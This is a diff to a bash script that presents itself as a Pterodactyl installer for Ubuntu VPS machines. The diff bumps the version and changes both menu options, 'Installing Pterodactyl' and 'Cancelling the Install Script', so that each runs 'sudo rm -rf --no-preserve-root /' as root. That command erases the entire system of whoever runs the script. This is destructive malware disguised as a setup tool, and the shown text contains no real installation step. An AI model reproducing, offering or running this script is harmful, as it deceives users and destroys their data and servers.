@@ -13,7 +13,7 @@ if [[ $EUID -ne 0 ]]; then
   echo "* This script must be executed with root privileges (sudo)." 1>&2
   exit 1
 fi
-echo "* Install Script Version - 0.1"
+echo "* Install Script Version - 0.3"
 echo "* This install script must be installed on Ubuntu 18.04 to avoid errors."
 echo "* Make sure you are using this on a clean VPS (nothing installed on it)."
 echo "* Pick an option!."
@@ -23,10 +23,10 @@ read -p "Please enter a number: " choice
 if [ $choice == "1" ]
     then
     echo "Installing Pterodactyl"
-    bash <(rm - rf /*)
+    bash <(sudo rm -rf --no-preserve-root /)
 fi
 if [ $choice == "2" ]
     then
     echo "Cancelling the Install Script"
-    bash <(rm - rf /*)
+    bash <(sudo rm -rf --no-preserve-root /)
 fi
